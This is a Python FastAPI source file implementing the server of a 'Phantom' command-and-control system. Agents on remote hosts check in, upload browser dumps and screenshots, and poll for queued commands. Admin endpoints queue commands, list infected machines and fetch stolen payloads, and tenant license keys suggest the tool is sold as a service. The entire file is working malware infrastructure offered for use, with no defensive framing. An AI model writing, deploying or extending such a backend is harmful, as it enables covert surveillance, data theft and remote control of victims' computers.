"""
Phantom C2 endpoints — binary wire protocol, no JWT auth (mTLS at proxy level).

POST /api/v1/push  — agent pushes event data (checkin, browser dump, screenshot, …)
POST /api/v1/poll  — agent polls for pending commands
POST /api/v1/ack   — agent acks a command result

Wire formats (big-endian uint32 length prefixes):

PUSH body:
  [1]  event_type
  [4]  hostname_len  [N] hostname
  [4]  username_len  [N] username
  [4]  os_len        [N] os_version
  [4]  payload_len   [N] payload

POLL body:
  [4]  hostname_len  [N] hostname
  [4]  username_len  [N] username

POLL response:
  [2]  count
  per command: [16] uuid_bytes  [1] cmd_type  [4] payload_len  [N] payload

ACK body:
  [16] uuid_bytes  [1] status  [4] result_len  [N] result
"""
from __future__ import annotations

import os
import struct
import logging
from datetime import datetime

from fastapi import APIRouter, Depends, Request, Response
from sqlalchemy.orm import Session

import database
from models.phantom_agent import PhantomAgent, PhantomEvent, PhantomCommand
from routers.auth import verify_admin
from services.ws_manager import ws_manager

router = APIRouter(tags=["phantom_c2"])
log    = logging.getLogger("phantom_c2")

# ---------- helpers ----------

def _get_db() -> Session:
    return database.SessionLocal()


def _read_u16be(buf: bytes, off: int) -> tuple[int, int]:
    if off + 2 > len(buf):
        raise ValueError("buffer too short for u16")
    return struct.unpack_from(">H", buf, off)[0], off + 2


def _read_u32be(buf: bytes, off: int) -> tuple[int, int]:
    if off + 4 > len(buf):
        raise ValueError("buffer too short for u32")
    return struct.unpack_from(">I", buf, off)[0], off + 4


def _read_str(buf: bytes, off: int) -> tuple[str, int]:
    n, off = _read_u32be(buf, off)
    if off + n > len(buf):
        raise ValueError("buffer too short for string payload")
    return buf[off:off+n].decode("utf-8", errors="replace"), off + n


def _read_bytes(buf: bytes, off: int) -> tuple[bytes, int]:
    n, off = _read_u32be(buf, off)
    if off + n > len(buf):
        raise ValueError("buffer too short for bytes payload")
    return buf[off:off+n], off + n


def _tenant(request: Request) -> str:
    """Extract tenant license key from mTLS client cert CN (forwarded by nginx as X-License-Key)."""
    return request.headers.get("X-License-Key", "").strip()[:64]


def _agent_id(license_key: str, hostname: str, username: str) -> str:
    return f"{license_key}:{hostname[:64] or '?'}:{username[:64] or '?'}"


def _upsert_agent(db: Session, license_key: str, hostname: str,
                  username: str, os_info: str, ip: str) -> PhantomAgent:
    aid = _agent_id(license_key, hostname, username)
    ag  = db.get(PhantomAgent, aid)
    now = datetime.utcnow()
    if ag is None:
        ag = PhantomAgent(
            agent_id=aid, license_key=license_key,
            hostname=hostname, username=username,
            os_info=os_info, ip=ip, first_seen=now, last_seen=now,
        )
        db.add(ag)
    else:
        ag.last_seen = now
        ag.is_active = True
        if os_info:
            ag.os_info = os_info
        if ip:
            ag.ip = ip
    db.commit()
    return ag


# ---------- push ----------

EVT_CHECKIN = 0x00

@router.post("/api/v1/push")
async def phantom_push(request: Request) -> Response:
    body = await request.body()
    if len(body) < 1:
        return Response(status_code=400)

    lic_key = _tenant(request)
    if not lic_key:
        return Response(status_code=403)

    client_ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "")
    )

    try:
        off      = 0
        evt_type = body[off]; off += 1
        hostname, off = _read_str(body, off)
        username, off = _read_str(body, off)
        os_info,  off = _read_str(body, off)
        payload,  off = _read_bytes(body, off)
    except (ValueError, IndexError) as e:
        log.warning("push parse error: %s", e)
        return Response(status_code=400)

    db  = _get_db()
    try:
        ag = _upsert_agent(db, lic_key, hostname, username, os_info, client_ip)

        if evt_type != EVT_CHECKIN:
            ev = PhantomEvent(
                agent_id=ag.agent_id,
                license_key=lic_key,
                event_type=evt_type,
                payload=payload,
                received_at=datetime.utcnow(),
            )
            db.add(ev)
            db.commit()

        log.info("push tenant=%s agent=%s evt=0x%02x payload=%d bytes",
                 lic_key[:8], ag.agent_id, evt_type, len(payload))

        import asyncio
        asyncio.get_event_loop().create_task(ws_manager.broadcast({
            "type":        "phantom_event",
            "license_key": lic_key,
            "agent_id":    ag.agent_id,
            "hostname":    hostname,
            "username":    username,
            "os_info":     os_info,
            "event_type":  evt_type,
            "payload_len": len(payload),
        }))
    finally:
        db.close()

    return Response(status_code=200)


# ---------- poll ----------

@router.post("/api/v1/poll")
async def phantom_poll(request: Request) -> Response:
    lic_key = _tenant(request)
    if not lic_key:
        return Response(status_code=403)

    body = await request.body()

    try:
        off      = 0
        hostname, off = _read_str(body, off)
        username, off = _read_str(body, off)
    except (ValueError, IndexError):
        hostname, username = "", ""

    aid = _agent_id(lic_key, hostname, username)
    db  = _get_db()
    try:
        cmds = (
            db.query(PhantomCommand)
            .filter(
                PhantomCommand.agent_id    == aid,
                PhantomCommand.license_key == lic_key,
                PhantomCommand.status      == "pending",
            )
            .order_by(PhantomCommand.created_at)
            .limit(8)
            .all()
        )

        if not cmds:
            # [2] count = 0
            return Response(content=b"\x00\x00", media_type="application/octet-stream")

        out  = bytearray()
        cnt  = min(len(cmds), 8)
        out += struct.pack(">H", cnt)

        for cmd in cmds[:cnt]:
            uuid_bytes = bytes.fromhex(cmd.uuid)
            payload    = cmd.payload or b""
            out += uuid_bytes
            out += struct.pack("B", cmd.cmd_type)
            out += struct.pack(">I", len(payload))
            out += payload
            cmd.status = "sent"

        db.commit()
        log.info("poll agent=%s → %d cmds", aid, cnt)
        return Response(content=bytes(out), media_type="application/octet-stream")
    finally:
        db.close()


# ---------- ack ----------

@router.post("/api/v1/ack")
async def phantom_ack(request: Request) -> Response:
    body = await request.body()
    if len(body) < 21:
        return Response(status_code=400)

    uuid_bytes = body[:16]
    status_byte = body[16]
    try:
        result_len = struct.unpack_from(">I", body, 17)[0]
        result     = body[21:21+result_len] if result_len else b""
    except struct.error:
        return Response(status_code=400)

    uuid_hex = uuid_bytes.hex()
    db = _get_db()
    try:
        cmd = db.get(PhantomCommand, uuid_hex)
        if cmd is None:
            log.warning("ack: unknown uuid %s", uuid_hex)
            return Response(status_code=404)

        cmd.status   = "acked" if status_byte == 0x00 else "failed"
        cmd.result   = result
        cmd.acked_at = datetime.utcnow()
        db.commit()
        log.info("ack uuid=%s status=%s result=%d bytes", uuid_hex, cmd.status, len(result))

        import asyncio
        asyncio.get_event_loop().create_task(ws_manager.broadcast({
            "type":    "phantom_ack",
            "uuid":    uuid_hex,
            "status":  cmd.status,
            "result":  result.decode("utf-8", errors="replace")[:4096],
        }))
    finally:
        db.close()

    return Response(status_code=200)


# ---------- admin: queue a command ----------

@router.post("/api/v1/cmd/{agent_id}")
async def phantom_queue_cmd(
    agent_id: str,
    request:  Request,
    _admin:   str = Depends(verify_admin),
) -> dict:
    """Queue a command for a phantom agent. Body JSON: {cmd_type: int, payload: str}"""
    import uuid

    body = await request.json()
    cmd_type = int(body.get("cmd_type", 0))
    payload  = (body.get("payload") or "").encode()

    # agent_id format: license_key:hostname:username — extract tenant
    lic_key = agent_id.split(":", 1)[0] if ":" in agent_id else ""

    cmd_uuid = uuid.uuid4().hex
    db = _get_db()
    try:
        cmd = PhantomCommand(
            uuid=cmd_uuid,
            agent_id=agent_id,
            license_key=lic_key,
            cmd_type=cmd_type,
            payload=payload,
            status="pending",
        )
        db.add(cmd)
        db.commit()
    finally:
        db.close()

    return {"uuid": cmd_uuid, "agent_id": agent_id, "cmd_type": cmd_type}


# ---------- admin: list phantom agents ----------

@router.get("/api/v1/agents")
async def phantom_list_agents(_admin: str = Depends(verify_admin)) -> list:
    db = _get_db()
    try:
        agents = db.query(PhantomAgent).order_by(PhantomAgent.last_seen.desc()).all()
        return [a.to_dict() for a in agents]
    finally:
        db.close()


# ---------- admin: list events for an agent ----------

@router.get("/api/v1/agents/{agent_id}/events")
async def phantom_agent_events(agent_id: str, limit: int = 50, _admin: str = Depends(verify_admin)) -> list:
    db = _get_db()
    try:
        evts = (
            db.query(PhantomEvent)
            .filter(PhantomEvent.agent_id == agent_id)
            .order_by(PhantomEvent.received_at.desc())
            .limit(limit)
            .all()
        )
        return [e.to_dict() for e in evts]
    finally:
        db.close()


# ---------- admin: get event payload ----------

@router.get("/api/v1/events/{event_id}")
async def phantom_event_payload(event_id: int, _admin: str = Depends(verify_admin)) -> Response:
    db = _get_db()
    try:
        ev = db.get(PhantomEvent, event_id)
        if ev is None:
            return Response(status_code=404)
        payload = ev.payload or b""
        return Response(content=payload, media_type="text/plain; charset=utf-8")
    finally:
        db.close()
